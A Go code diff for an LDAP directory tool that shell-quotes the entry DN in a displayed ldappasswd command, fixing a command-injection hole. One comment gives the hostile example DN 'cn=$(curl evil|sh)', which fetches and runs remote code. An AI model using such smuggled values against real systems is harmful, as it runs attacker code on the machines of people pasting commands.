@@ -3,6 +3,7 @@ package directory
 import (
 	"errors"
 	"fmt"
+	"regexp"
 	"sort"
 	"strings"
 
@@ -223,8 +224,37 @@ const passwordNotice = `# This is an LDAP Password Modify extended operation (RF
 #
 # The equivalent on the command line:
 #
-#   ldappasswd -H $LDAP_URI -D "$BIND_DN" -W -S %s
+#   ldappasswd -H "$LDAP_URI" -D "$BIND_DN" -W -S %s
 `
+
+// passwordNoticeFor fills in the command line for one entry.
+//
+// The DN is quoted for a shell. RFC 4514 escaping leaves $, backticks,
+// parentheses, | and & alone, so an entry named cn=$(curl evil|sh) rendered
+// bare is a command that runs on the machine of whoever pastes it -- and the
+// person resetting a password is rarely the person who named the entry.
+func passwordNoticeFor(d dn.DN) string {
+	return fmt.Sprintf(passwordNotice, ShellQuote(d.String()))
+}
+
+// safeUnquoted is the set a POSIX shell passes through untouched. Anything
+// outside it is quoted rather than escaped character by character, which is
+// both easier to get right and easier to read.
+var safeUnquoted = regexp.MustCompile(`^[A-Za-z0-9_@%+=:,./-]+$`)
+
+// ShellQuote makes one argument safe for a POSIX shell, for the command lines
+// Alder shows beside what it does.
+func ShellQuote(s string) string {
+	if s == "" {
+		return "''"
+	}
+	if safeUnquoted.MatchString(s) {
+		return s
+	}
+	// Inside single quotes a shell honours nothing at all, so the only case to
+	// handle is a single quote itself: close, emit an escaped one, reopen.
+	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
+}
 
 // LDIF renders the change as an RFC 2849 change record.
 //
@@ -233,7 +263,7 @@ const passwordNotice = `# This is an LDAP Password Modify extended operation (RF
 // a value broken across lines at column 76 is harder to check, not easier.
 func (c ChangeRecord) LDIF() string {
 	if c.Type == ChangeSetPassword {
-		return fmt.Sprintf(passwordNotice, c.DN)
+		return passwordNoticeFor(c.DN)
 	}
 	var b strings.Builder
 	w := ldif.NewWriter(&b)
@@ -246,7 +276,7 @@ func (c ChangeRecord) LDIF() string {
 // and for copying into a file that other tools will read.
 func (c ChangeRecord) LDIFFolded() string {
 	if c.Type == ChangeSetPassword {
-		return fmt.Sprintf(passwordNotice, c.DN)
+		return passwordNoticeFor(c.DN)
 	}
 	var b strings.Builder
 	w := ldif.NewWriter(&b)
